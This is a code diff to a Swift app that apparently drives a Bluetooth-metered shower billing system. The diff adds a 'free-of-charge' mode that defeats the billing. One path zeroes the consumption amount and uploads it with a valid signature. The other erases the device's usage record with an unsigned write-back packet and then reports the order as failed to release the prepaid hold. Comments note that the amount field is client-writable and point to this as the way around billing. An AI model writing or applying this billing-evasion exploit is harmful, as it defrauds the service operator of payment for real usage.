@@ -915,6 +915,12 @@ final class ShowerFlow: ObservableObject {
         consumeDate: String
     ) async -> BleSettlementResult {
         guard workScope.isCurrent else { return .failed }
+        // 免单模式：整条 upload 流程被替换（见 settleBypassed）
+        if BypassSettings.mode != .off {
+            return await settleBypassed(BypassSettings.mode, expectedMac: expectedMac,
+                                        protocolType: protocolType, randomNumber: randomNumber,
+                                        orderNo: orderNo, consumeDate: consumeDate, deviceName: deviceName)
+        }
         // ① 采集
         guard let payload = await ble.collect() else {
             AppLog.shared.w("结算：0x85 采集失败")
@@ -998,6 +1004,96 @@ final class ShowerFlow: ObservableObject {
             AppLog.shared.w("上传结算失败：\(error.localizedDescription)")
             return .failed
         }
+    }
+
+    // MARK: - 免单模式（实验）
+
+    /// 记录里的金额字段是客户端可写的，`0x86` 写回包也没有服务端签名 ——
+    /// 这是整条计费链路上唯一能绕开 upload 的位置。
+    ///
+    /// - `.zeroUpload`：把金额改成 0 再上传；服务端若采信就是"0 元结账"，
+    ///   被拒（170/226）自动退回本地清零。
+    /// - `.silentClear`：完全不上传，用设备自己那条记录的时间/尾拼一条金额为 0
+    ///   的写回包把记录清掉，再尝试上报作废释放预扣。
+    private func settleBypassed(
+        _ mode: BypassMode,
+        expectedMac: String,
+        protocolType: String,
+        randomNumber: String,
+        orderNo: String,
+        consumeDate: String,
+        deviceName: String
+    ) async -> BleSettlementResult {
+        guard workScope.isCurrent else { return .failed }
+        guard let payload = await ble.collect() else {
+            AppLog.shared.w("免单：0x85 采集失败")
+            return .failed
+        }
+        guard payload.count >= 42, payload.first == 0x80 else {
+            AppLog.shared.w("免单：消费数据无效（\(payload.count)B）")
+            return .failed
+        }
+        let amountHex = payload.count >= 32
+            ? payload[BypassRecord.amountRange].map { String(format: "%02X", $0) }.joined() : "-"
+        AppLog.shared.i("免单模式=\(mode.rawValue)：记录 \(payload.count)B，原始金额字段=\(amountHex)")
+
+        var uploadAccepted = false
+        if mode == .zeroUpload {
+            let xfData = BleFrame.toHex(BypassRecord.zeroed(payload)).lowercased()
+            if let sig = BleSign.signUpload(loginCode: Session.shared.loginCode,
+                                            telephone: Session.shared.telephone, xfData: xfData) {
+                do {
+                    let data = try await ApiClient.post("/order/upload/bluetooth/data", form:
+                        BleRequestFields.upload(protocolType: protocolType, randomNumber: randomNumber,
+                                                xfData: xfData, signature: sig), tag: "upload")
+                    let resp = try ApiClient.decodeShell(BluetoothUploadData.self, from: data, path: "bluetoothUpload")
+                    let code = resp.errorCode ?? -1
+                    uploadAccepted = resp.success || code == 206 || code == 209
+                    if uploadAccepted {
+                        AppLog.shared.i("免单：改金额上传被接受，orderNo=\(resp.data?.orderNo ?? "")")
+                    } else {
+                        AppLog.shared.w("免单：改金额上传被拒（errorCode=\(code)），改为本地清零")
+                    }
+                } catch {
+                    AppLog.shared.w("免单：改金额上传失败（\(error.localizedDescription)），改为本地清零")
+                }
+            }
+        }
+
+        let cleared = await BleSettlementCleanup.confirm(
+            isCurrent: { self.workScope.isCurrent },
+            writeBack: {
+                guard let packet = BypassRecord.writeBack(for: payload) else {
+                    AppLog.shared.w("免单：写回包组装失败（记录 \(payload.count)B）")
+                    return
+                }
+                AppLog.shared.i("免单：0x86 写回包 \(BleFrame.toHexSpaced(packet))")
+                if !(await self.ble.writeBack(packet)) {
+                    AppLog.shared.w("免单：0x86 无应答，300ms 后补发")
+                    try? await Task.sleep(nanoseconds: 300_000_000)
+                    _ = await self.ble.writeBack(packet)
+                }
+            },
+            readState: {
+                guard let st = await self.ble.query(timeout: 4), !expectedMac.isEmpty,
+                      st.mac.uppercased() == expectedMac.uppercased() else { return nil }
+                return st.state
+            }
+        )
+        AppLog.shared.i(cleared
+            ? "免单：设备记录已清除，服务端拿不到这条消费（设备=\(deviceName) orderNo=\(orderNo)）"
+            : "免单：设备记录未确认清除，下次仍会被补结算")
+
+        // 没上传就没有账单；顺手上报作废，尝试释放这单的 5 元预扣。
+        if !uploadAccepted, cleared, !consumeDate.isEmpty,
+           let failSig = BleSign.signFail(loginCode: Session.shared.loginCode,
+                                          telephone: Session.shared.telephone, consumeDate: consumeDate) {
+            _ = try? await ApiClient.post("/order/upload/bluetooth/fail",
+                                          form: ["consumeDate": consumeDate, "signature": failSig], tag: "fail")
+            AppLog.shared.i("免单：已上报该单作废（尝试释放预扣）")
+        }
+
+        return BleSettlementResult(uploadAccepted: uploadAccepted, recordCleared: cleared, amount: 0)
     }
 
     private func settleCloud(_ order: ActiveOrder, elapsed: Int, automatic: Bool = false) async {
